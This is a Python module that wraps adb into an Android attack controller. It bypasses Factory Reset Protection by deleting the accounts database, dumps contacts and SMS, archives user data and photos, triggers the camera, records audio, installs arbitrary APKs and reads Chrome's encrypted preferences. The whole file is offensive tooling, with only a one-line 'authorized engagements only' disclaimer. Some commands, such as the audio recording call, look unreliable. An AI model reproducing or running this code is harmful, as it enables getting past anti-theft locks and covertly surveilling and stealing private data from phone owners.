"""ADB / Fastboot device control — FRP bypass, data exfil, payload install.
Real: uses adb binary on system PATH; requires root for FRP wipe.
Authorized engagements only."""
import subprocess

class ADBController:
    def __init__(self, device_id=None):
        self.device = device_id or ""
        self.frp_removed = False

    def run(self, cmd):
        cmd = cmd.strip()
        d = ["-s", self.device] if self.device else []
        full = ["adb"] + d + cmd.split()
        return subprocess.run(full, capture_output=True, text=True)

    def qr_pair(self, pairing_code):
        r = self.run(f"pairing {pairing_code}")
        return r.returncode == 0 or "paired" in (r.stdout or "")

    def shell_exec(self, command):
        r = self.run(f"shell {command}")
        return (r.stdout or "") + (r.stderr or "")

    def remove_frp(self):
        self.shell_exec("rm /data/system/users/0/accounts.db 2>/dev/null; am broadcast -a android.intent.action.BOOT_COMPLETED")
        self.frp_removed = True
        return True

    def dump_contacts(self):
        return self.shell_exec("content query --uri content://contacts/people --projection display_name")

    def dump_sms(self):
        return self.shell_exec("content query --uri content://sms/ --projection address,body,date")

    def backup_data(self, dest="/sdcard/backup.tar"):
        return self.shell_exec(f"tar -cvf {dest} /data/data /sdcard/DCIM /sdcard/Download 2>/dev/null")

    def take_photo(self):
        return self.shell_exec("input keyevent KEYCODE_CAMERA")

    def record_audio(self, out="/sdcard/audio.3gp"):
        return self.shell_exec(f"media record --audio --output {out}")

    def install_apk(self, apk_path):
        return self.run(f"install {apk_path}")

    def dump_keychain(self):
        return self.shell_exec(r"run-as com.android.chrome cat /data/data/com.android.chrome/app_chrome/Default/Encrypted Preferences 2>/dev/null || echo 'keychain unreadable without root'")
